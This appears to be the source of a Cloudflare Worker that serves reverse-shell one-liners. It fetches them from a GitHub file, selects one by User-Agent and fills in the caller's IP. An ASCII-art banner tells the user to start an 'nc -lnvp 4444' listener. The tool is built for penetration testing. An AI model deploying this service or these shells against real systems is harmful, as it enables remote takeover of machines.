export default {
    async fetch(request) {
      var response = ""
      var ascii_art = `
                    ____     ____
                  /'    |   |    \\ 
                /    /  |   | \\   \\ 
              /    / |  |   |  \\   \\ 
             (   /   |  """"   |\\   \\   
             | /   / /^\\    /^\\  \\  _|
              ~   | |   |  |   | | ~
                  | |__O|__|O__| |              
                /~~      \\/     ~~\\           
               /   (      |      )  \\ 
               /,   \\____/^\\___/'   \\ 
                / -____-|_|_|-____-\\ 
           _____|_/~~~~\\____/~~~~\\__|_____
          |____|_|     |____|     |__|____|
              | \`^-^-^'    \`^-^-^'    |           \x1b[35m    IMPORTANT - Usage: \x1b[0m
              |                       |     \x1b[35mcurl curl-shells.com -A "Windows" [-H "IP:10.10.10.10"]\x1b[0m
              |     "Silly Rabbit,    |  
              |                       |     \x1b[35mTip: Use -A "Help" for more information\x1b[0m
              |  Root is for Admins!" |              
              |                       |
              |  \x1b[32mProgram Created By:\x1b[0m  |    \x1b[36mCredit to revshells.com and pentestmonkey.net\x1b[0m
              |                       |        \x1b[36mfor these amazing reverse shells!\x1b[0m
              |\x1b[32mgithub.com/Kaiden-cyber\x1b[0m|
               -----------------------      \x1b[36mMake sure to check out their sites for more\x1b[0m
                                                   \x1b[36madvanced shells and tactics!\x1b[0m
                                       
      \x1b[31mNOTE - Don't forget to start a listener with: nc -lnvp 4444 
      NOTE - Remember to Replace all <LHOST> With your IP \x1b[0m


      `
      response += ascii_art;
      const User_Agent = request.headers.get("User-Agent") || "";
      const lHost = request.headers.get("IP") || "<LHOST>";

      var ShellsFile = "Placeholder";
      const url = 'https://raw.githubusercontent.com/Kaiden-cyber/curl-shells/refs/heads/main/shells.txt';

      function SplitShells(){
        var shellList = ShellsFile.split('---').map(section => section.trim());
        for(var i = 0;i<shellList.length;i++){
          if(User_Agent.includes(shellList[i])){
            return shellList[i+1];
          }
        }
        return "Incorrect Option: " + User_Agent + "! Please read the help message(-A 'Help') and try again!";
      }
      try {
        const fetchResponse = await fetch(url);
        ShellsFile = await fetchResponse.text();
        ShellsFile = SplitShells() +"\n\n";
      } catch (err) {
        ShellsFile = "Error: Could not Get any Shells ;-;\n" + err;
      }

      ShellsFile =  ShellsFile.replace(/<LHOST>/g, "\x1b[34m" + lHost + "\x1b[0m" + " \x1b[32m") ;
      ShellsFile = "\x1b[32m" + ShellsFile + "\x1b[0m"
      response += ShellsFile + "\n" + "\x1b[34m      Thank You For Using cURL Shells! \x1b[0m";
      return new Response(response);
    },
  };
  